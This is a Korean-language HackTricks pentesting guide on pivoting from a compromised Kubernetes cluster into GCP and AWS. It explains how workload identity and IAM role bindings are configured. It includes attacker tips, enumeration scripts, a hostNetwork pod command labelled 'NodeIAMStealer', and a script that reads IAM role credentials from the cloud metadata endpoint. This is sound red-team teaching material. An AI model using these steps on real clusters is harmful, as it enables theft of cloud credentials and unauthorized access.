# Kubernetes Pivoting to Clouds

{% hint style="success" %}
AWS 해킹을 배우고 실습하세요: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP 해킹을 배우고 실습하세요: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
{% endhint %}

## GCP

만약 GCP 내에서 k8s 클러스터를 실행 중이라면 아마도 클러스터 내에서 실행 중인 어떤 애플리케이션이 GCP에 액세스해야 할 것입니다. 이를 수행하는 데는 일반적으로 두 가지 방법이 있습니다:

### Secret으로 GCP-SA 키 마운트

**kubernetes 애플리케이션에 GCP 액세스 권한을 부여**하는 일반적인 방법은 다음과 같습니다:

* GCP 서비스 계정 생성
* 원하는 권한을 할당
* 생성된 SA의 json 키 다운로드
* pod 내에서 시크릿으로 마운트
* json이 있는 경로를 가리키는 GOOGLE\_APPLICATION\_CREDENTIALS 환경 변수 설정

{% hint style="warning" %}
따라서, **공격자**로서, pod 내의 컨테이너를 compromise하면 해당 **env 변수** 및 GCP 자격 증명이 있는 **json 파일**을 확인해야 합니다.
{% endhint %}

### GSA json을 KSA 시크릿에 연결

GSA에 액세스 권한을 부여하는 방법은 다음과 같이 GSA를 GKE 클러스터에 바인딩하는 것입니다:

* 다음 명령을 사용하여 GKE 클러스터와 동일한 네임스페이스에 Kubernetes 서비스 계정을 생성하세요:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* 다음 예제와 같이 `gcloud` 명령줄 도구를 사용하여 GKE 클러스터에 액세스 권한을 부여하려는 GCP 서비스 계정의 자격 증명을 포함하는 Kubernetes Secret을 생성합니다:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* 다음 명령을 사용하여 Kubernetes 시크릿을 Kubernetes 서비스 계정에 바인딩하십시오:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
**두 번째 단계**에서는 **GSA의 자격 증명을 KSA의 비밀로 설정**했습니다. 그런 다음, **GKE 클러스터 내부에서 해당 비밀을 읽을 수 있다면**, 해당 GCP 서비스 계정으로 **스케일 업**할 수 있습니다.
{% endhint %}

### GKE Workload Identity

Workload Identity를 사용하면 [Kubernetes 서비스 계정](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)을 [Google 서비스 계정](https://cloud.google.com/iam/docs/understanding-service-accounts)으로 작동하도록 구성할 수 있습니다. Kubernetes 서비스 계정으로 실행되는 Pod는 Google Cloud API에 액세스할 때 자동으로 Google 서비스 계정으로 인증됩니다.

이 동작을 활성화하려면 **GCP에서 Workload Identity를 활성화**하고 k8s가 흉내 내기를 원하는 GCP SA를 생성해야 합니다.

* 새 클러스터에서 **Workload Identity 활성화**

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **새 노드 풀 생성/업데이트** (Autopilot 클러스터는 이 작업이 필요하지 않음)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* K8s에서 GCP 권한을 가진 **GCP 서비스 계정을 표현**하도록 만듭니다:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **클러스터**에 **연결**하고 사용할 **서비스 계정**을 **생성**합니다.

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **GSA와 KSA를 바인딩(bind)합니다** 

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* **KSA**와 함께 **pod**를 실행하고 **GSA**에 대한 **액세스**를 확인하십시오:
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
다음 명령을 사용하여 필요한 경우 인증을 확인하십시오:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
K8s 내부의 공격자로서는 SA를 검색해야 합니다. 이때 SA에 `iam.gke.io/gcp-service-account` 주석이 있는지 확인해야 합니다. 이 주석이 있다면 SA가 GCP에서 무언가에 액세스할 수 있다는 것을 나타냅니다. 또 다른 옵션은 클러스터 내의 각 KSA를 남용하고 액세스 권한이 있는지 확인하는 것입니다.\
GCP에서는 항상 바인딩을 열거하고 Kubernetes 내부의 SA에게 어떤 액세스를 부여하는지 파악하는 것이 흥미로울 수 있습니다.
{% endhint %}

다음은 **모든 pod 정의를 반복**하면서 해당 **주석을 찾는** 스크립트입니다:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM role for Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Pods에 IAM 역할을 부여하는 (오래된) 방법은 [**Kiam**](https://github.com/uswitch/kiam) 또는 [**Kube2IAM**](https://github.com/jtblin/kube2iam) **서버**를 사용하는 것입니다. 기본적으로 클러스터 내에서 **특권 IAM 역할**을 가진 **데몬셋**을 실행해야 합니다. 이 데몬셋은 필요한 팟에 IAM 역할에 액세스할 수 있도록 제공할 것입니다.

먼저 **네임스페이스 내에서 액세스할 수 있는 역할을 구성**해야 하며, 이를 네임스페이스 객체 내의 주석을 사용하여 수행합니다:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

네임스페이스가 IAM 역할로 구성된 후에는 Pods가 갖게 될 수 있는 역할을 각 Pod 정의에 원하는 역할을 지정할 수 있습니다. 다음과 같이 할 수 있습니다:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
공격자로서, 만약 **이러한 주석들을** pods나 namespaces에서 찾거나 kiam/kube2iam 서버가 실행 중이라면 (아마도 kube-system에) 이미 **pods에서 사용된 모든 역할을** 그리고 더 많은 것들을 (AWS 계정에 액세스 권한이 있다면 역할을 나열할 수 있음) **가장할 수 있습니다**.
{% endhint %}

#### IAM 역할을 사용하여 Pod 생성

{% hint style="info" %}
지정해야 하는 IAM 역할은 kiam/kube2iam 역할과 동일한 AWS 계정에 있어야 하며 해당 역할에 액세스할 수 있어야 합니다.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM Role for K8s Service Accounts via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

이것은 **AWS에서 권장하는 방법**입니다.

1. 먼저 클러스터에 [OIDC 공급자를 생성해야 합니다](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. 그런 다음 SA가 필요로 하는 권한을 갖는 IAM 역할을 생성합니다.
3. IAM 역할과 SA 간에 [신뢰 관계를 생성합니다](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) (또는 역할에 액세스 권한을 부여하는 네임스페이스). _신뢰 관계는 주로 OIDC 공급자 이름, 네임스페이스 이름 및 SA 이름을 확인합니다_.
4. 마지막으로, **역할의 ARN을 나타내는 주석이 있는 SA를 생성**하고 해당 SA로 실행되는 팟은 **역할의 토큰에 액세스**할 수 있습니다. **토큰**은 **파일 안에 쓰여지며** 경로는 **`AWS_WEB_IDENTITY_TOKEN_FILE`**에 지정됩니다 (기본값: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`).
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
**/var/run/secrets/eks.amazonaws.com/serviceaccount/token**에서 토큰을 사용하여 **aws를 가져오려면** 다음을 실행하십시오:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
공격자로서 K8s 클러스터를 열거할 수 있다면, **해당 주석이 있는 서비스 계정을 확인**하여 **AWS로 승격**할 수 있습니다. 이를 위해 IAM **특권 서비스 계정 중 하나를 사용하여** **팟을 실행/생성**하여 토큰을 도용하십시오.

또한, 팟 내부에 있다면 **AWS\_ROLE\_ARN** 및 **AWS\_WEB\_IDENTITY\_TOKEN**과 같은 환경 변수를 확인하십시오.
{% endhint %}

{% hint style="danger" %}
가끔 **역할의 신뢰 정책**이 **잘못 구성**될 수 있으며, 예상된 서비스 계정에 AssumeRole 액세스를 부여하는 대신 **모든 서비스 계정**에 부여할 수 있습니다. 따라서 제어된 서비스 계정에 주석을 작성할 수 있다면 역할에 액세스할 수 있습니다.

자세한 정보는 **다음 페이지를 확인하십시오**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### 클러스터 내 IAM 역할을 가진 팟 및 서비스 계정 찾기

다음은 **모든 팟 및 서비스 계정을 순회**하며 해당 **주석을 찾는** 스크립트입니다:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### 노드 IAM 역할

이전 섹션은 파드로 IAM 역할을 어떻게 도용하는지에 대한 것이었지만, **K8s 클러스터의 노드는 클라우드 내부의 인스턴스가 될 것**입니다. 이는 노드가 새로운 IAM 역할을 가질 가능성이 매우 높다는 것을 의미합니다. (_일반적으로 K8s 클러스터의 모든 노드가 동일한 IAM 역할을 가지므로 각 노드를 확인해 볼 가치가 없을 수도 있음을 유의하세요_).

그러나 노드에서 메타데이터 엔드포인트에 액세스하려면 노드에 있어야 합니다 (ssh 세션?) 또는 적어도 동일한 네트워크에 있어야 합니다:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### IAM 역할 토큰 도용

이전에 우리는 **Pod에 IAM 역할을 부여하는 방법**이나 심지어 **Node로 이탈하여 인스턴스에 연결된 IAM 역할을 도용하는 방법**에 대해 논의했습니다.

다음 스크립트를 사용하여 새롭게 얻은 **IAM 역할 자격 증명을 도용**할 수 있습니다:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## 참고 자료

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* 해킹 트릭을 공유하려면 [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃헙 레포지토리로 PR을 제출하세요.

</details>
{% endhint %}
